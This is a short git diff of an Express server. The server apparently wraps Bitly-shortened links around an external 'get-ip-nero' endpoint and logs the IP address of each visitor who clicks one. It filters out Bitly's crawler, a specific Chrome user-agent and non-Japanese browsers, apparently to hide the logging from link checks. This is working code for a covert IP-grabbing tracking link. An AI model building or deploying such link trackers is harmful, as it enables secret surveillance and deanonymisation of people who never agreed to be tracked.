@@ -75,12 +75,11 @@ app
     };
   })
   .post("/generated", (req, res) => {
-    const name = req.body.name, url = req.body.url, pass = req.query.pass || null, userId = req.query.userId || null;
+    const name = req.body.name, url = req.body.url, userId = req.query.userId || null;
     const query = {
       name: name,
       original: url,
-      id: userId,
-      pass: pass
+      id: userId
     };
     const longUrl = "https://get-ip-nero.herokuapp.com/get/ip/nero?" + qs.stringify(query),
     req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
@@ -106,7 +105,7 @@ app
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
     str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
     // push msg
-    if ( !nom || !id || !original || 
+    if ( !id || 
       req.headers["user-agent"] === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36' || 
       req.headers["accept-language"] !== 'ja' || 
       req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
